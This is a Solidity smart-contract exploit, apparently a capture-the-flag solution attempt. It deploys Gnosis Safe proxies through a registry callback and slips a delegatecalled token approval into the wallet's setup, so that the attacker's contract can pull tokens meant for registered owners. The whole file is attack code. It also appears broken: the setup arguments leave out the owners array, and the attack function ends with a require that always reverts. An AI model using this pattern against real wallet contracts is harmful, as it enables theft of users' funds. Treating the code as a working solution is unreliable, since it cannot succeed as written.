pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract WalletRegistryExploit {
    address singleton;
    IERC20 token;
    IProxyCreationCallback walletRegistry;
    GnosisSafeProxyFactory walletFactory;
    bytes encodedApprove;

    constructor(address _singleton, address _token, address _walletFactory, address _walletRegistry) {
        singleton = _singleton;
        token = IERC20(_token);
        walletFactory = GnosisSafeProxyFactory(_walletFactory);
        walletRegistry = IProxyCreationCallback(_walletRegistry);

        encodedApprove = abi.encodeWithSignature("approve(address)", address(this));
    }

    function approve(address spender) external {
        token.approve(spender, 10 ether);
    }

    function attack(address[] calldata _owners) external {
        bytes memory setup = abi.encodeWithSelector(
            GnosisSafe.setup.selector,
            1,
            address(this),
            encodedApprove,
            0,
            0,
            0,
            0
        );
        GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
            singleton,
            setup,
            uint256(uint160(_owners[0])),
            walletRegistry
        );

        require(token.allowance(address(proxy), address(this)) == 10 ether, 'Approval unsuccessful');
        require(1 == 2, 'Approval successful');
    }
}